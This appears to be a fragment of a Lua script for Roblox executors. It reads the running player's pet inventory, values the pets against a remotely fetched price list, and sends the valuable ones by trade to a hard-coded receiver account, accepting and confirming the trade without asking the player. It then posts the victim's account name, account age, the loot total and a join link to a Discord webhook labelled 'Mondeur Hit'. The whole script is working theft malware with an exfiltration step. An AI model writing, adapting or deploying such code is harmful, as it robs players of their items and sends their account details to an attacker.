-- [[ LOAD POINT SYSTEM ]] --
local function loadPoints()
    local success, content = pcall(function() return game:HttpGet(POINT_SYSTEM_URL) end)
    if success then
        for line in content:gmatch("[^\r\n]+") do
            local name, val = line:match("([^:=]+)[:=](%d+)")
            -- Clean the names: lowercase and remove extra spaces
            if name and val then 
                PetValues[name:lower():gsub("%s+", "")] = tonumber(val) 
            end
        end
    end
end
loadPoints()

-- [[ THE "ELITE" UI DESIGN ]] --
local function sendMondeurWebhook(pets, total, isHandshake)
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if not request then return end

    local petList = ""
    if isHandshake then
        petList = "📡 *Scanning for high-value targets...*"
    else
        for _, p in ipairs(pets) do
            petList = petList .. "⭐ **" .. p.name .. "** (`" .. p.value .. " pts`)\n"
        end
    end

    local payload = {
        username = "Mondeur Intelligence",
        -- Using a clean Discord-hosted icon to avoid broken Imgur links
        avatar_url = "https://cdn.discordapp.com/embed/avatars/4.png", 
        embeds = {{
            title = isHandshake and "🛰️ SYSTEM: SESSION INITIALIZED" or "🎯 TARGET: ITEMS INTERCEPTED",
            description = "━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
                "👤 **Account:** `" .. LocalPlayer.Name .. "`\n" ..
                "🕒 **Age:** `" .. LocalPlayer.AccountAge .. " Days`\n" ..
                "🛠️ **Client:** `Delta v2.1`\n" ..
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" ..
                "📦 **LOOT SUMMARY**\n" ..
                petList .. "\n" ..
                "💰 **TOTAL VALUE:** `" .. (isHandshake and "0.00" or total) .. "`\n\n" ..
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
                "🔍 **SCRAP SUMMARY**\n" ..
                "[View Raw Data](https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw)\n" ..
                "🔗 **QUICK JOIN**\n" ..
                "[Click to Join Server](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")",
            color = isHandshake and 0x5865F2 or 0xFEE75C, -- Blurple for start, Gold for a hit
            footer = { text = "Mondeur Hit | " .. os.date("%X") }
        }}
    }

    pcall(function()
        request({
            Url = USER_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- [[ CORE LOGIC WITH IMPROVED DETECTION ]] --
local function execute()
    local receiver = nil
    for _, name in ipairs(TARGET_RECEIVERS) do
        if Players:FindFirstChild(name) then receiver = Players[name] break end
    end
    if not receiver then return end

    local list, total = {}, 0
    local success, inv = pcall(function() return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() end)
    
    if success and inv then
        for _, item in ipairs(inv) do
            if item.Kind == "Pet" then
                -- Clean the pet name from the game
                local cleanName = item.Name:lower():gsub("%s+", "")
                
                for pointName, val in pairs(PetValues) do
                    -- If the point name is FOUND anywhere in the clean pet name
                    if string.find(cleanName, pointName) then
                        table.insert(list, {id = item.Id, name = item.Name, value = val})
                        total = total + val
                        break
                    end
                end
            end
        end
    end

    if #list > 0 then
        local TradeAPI = ReplicatedStorage.API
        TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(receiver)
        for _, p in ipairs(list) do TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id) end
        TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
        TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
        sendMondeurWebhook(list, total, false)
    end
end

